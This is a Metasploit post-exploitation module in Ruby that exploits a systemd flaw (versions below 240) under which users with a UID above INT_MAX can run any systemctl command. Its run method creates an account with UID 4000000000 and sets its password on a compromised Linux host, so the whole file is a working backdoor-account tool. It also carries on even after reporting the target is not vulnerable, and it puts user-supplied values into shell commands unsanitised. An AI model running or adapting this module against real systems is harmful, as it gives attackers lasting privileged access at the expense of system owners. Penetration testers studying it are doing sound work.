##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
      'Name' => 'Linux Manage Add User UID > INT_MAX',
      'Description' => %q{
        Unprivileged users with UID > INT_MAX can execute any systemctl command.
      },
      'License' => MSF_LICENSE,
      'Author' =>
      [
        'Carter Brainerd (@cbrnrd)', # Metasploit module
        '@4z3' # Discovery
      ],
      'Platform' => 'Linux',
      'SessionTypes' => ['shell', 'meterpreter']
    ))
    register_options(
      [
        OptString.new('USERNAME', [true, 'The username of the new user', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new user', 'msf'])
      ]
    )
  end

  def check
    return true if get_systemctl_version < 240
    false
  end

  def get_systemctl_version
    # Looks like this:
    # $ systemctl --version
    # systemd 239
    # +PAM ....... other junk
    return cmd_exec('systemctl --version').to_s.split(' ')[1].to_i
  end

  def run
    print_error("System is not vulnerable (systemctl v#{get_systemctl_version})") unless check
    cmd_exec("useradd -u 4000000000 #{datastore['USERNAME']}")
    cmd_exec("echo -e \"#{datastore['PASSWORD']}\" | passwd --stdin #{datastore['USERNAME']}")
  end
end
